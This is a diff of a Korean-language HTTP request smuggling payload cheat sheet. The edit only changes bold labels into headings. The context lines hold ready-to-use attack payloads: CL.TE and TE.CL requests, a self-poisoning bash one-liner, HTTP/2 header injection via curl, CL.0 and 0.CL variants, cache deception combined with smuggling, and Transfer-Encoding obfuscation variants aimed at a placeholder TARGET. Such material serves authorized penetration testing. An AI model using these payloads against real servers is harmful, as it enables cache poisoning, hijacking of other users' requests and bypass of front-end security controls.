@@ -2,7 +2,7 @@
 
 ### 기본 페이로드
 
-**기준선 측정:**
+#### 기준선 측정
 ```bash
 START=$(date +%s%N)
 printf 'GET / HTTP/1.1\r\nHost: TARGET\r\nConnection: close\r\n\r\n' \
@@ -11,7 +11,7 @@ END=$(date +%s%N)
 echo "Baseline: $(( ($END - $START) / 1000000 ))ms"
 ```
 
-**CL.TE (프론트=CL, 백엔드=TE):**
+#### CL.TE (프론트=CL, 백엔드=TE)
 ```
 POST / HTTP/1.1
 Host: TARGET
@@ -25,7 +25,7 @@ Q
 ```
 정상 <100ms, 취약 5s+ (불완전 청크가 백엔드 타임아웃 유발)
 
-**TE.CL (프론트=TE, 백엔드=CL):**
+#### TE.CL (프론트=TE, 백엔드=CL)
 ```
 POST / HTTP/1.1
 Host: TARGET
@@ -38,7 +38,7 @@ Transfer-Encoding: chunked
 X
 ```
 
-**Self-poisoning (확정 검증):**
+#### Self-poisoning (확정 검증)
 ```bash
 # 같은 커넥션에서 밀수 + 후속 요청
 (printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 56\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /nonexistent HTTP/1.1\r\nHost: TARGET\r\n\r\n'; sleep 0.5; printf 'GET / HTTP/1.1\r\nHost: TARGET\r\nConnection: close\r\n\r\n') \
@@ -53,7 +53,7 @@ curl --http2 "https://target/" -H "Foo: bar
 Smuggled: yes"
 ```
 
-**CL.0 (2024 신변형):**
+#### CL.0 (2024 신변형)
 ```
 POST / HTTP/1.1
 Host: TARGET
@@ -64,7 +64,7 @@ Host: TARGET
 
 ```
 
-**0.CL (CL 미선언):**
+#### 0.CL (CL 미선언)
 ```
 POST / HTTP/1.1
 Host: TARGET
@@ -74,7 +74,7 @@ Host: TARGET
 
 ```
 
-**Expect: 100-continue 처리 차이:**
+#### Expect: 100-continue 처리 차이
 ```
 POST / HTTP/1.1
 Host: TARGET
@@ -85,7 +85,7 @@ Transfer-Encoding: chunked
 (100 응답 없이 본문 즉시 전송)
 ```
 
-**Cache deception + smuggling:**
+#### Cache deception + smuggling
 ```
 # 정적 확장자 경로 (`/user.js`)로 smuggle된 요청이 캐시되어 재사용
 POST /user.js HTTP/1.1
@@ -102,7 +102,7 @@ Host: TARGET
 
 ---
 
-**우회 페이로드 (TE 헤더 변형):**
+#### 우회 페이로드 (TE 헤더 변형)
 
 | 변형 | 헤더 |
 |---|---|
@@ -125,7 +125,7 @@ for variant in 'Transfer-Encoding : chunked' $'Transfer-Encoding:\tchunked' 'Tra
 done
 ```
 
-**CL 변형:**
+#### CL 변형
 ```
 Content-Length:0
 Content-Length: 0\r
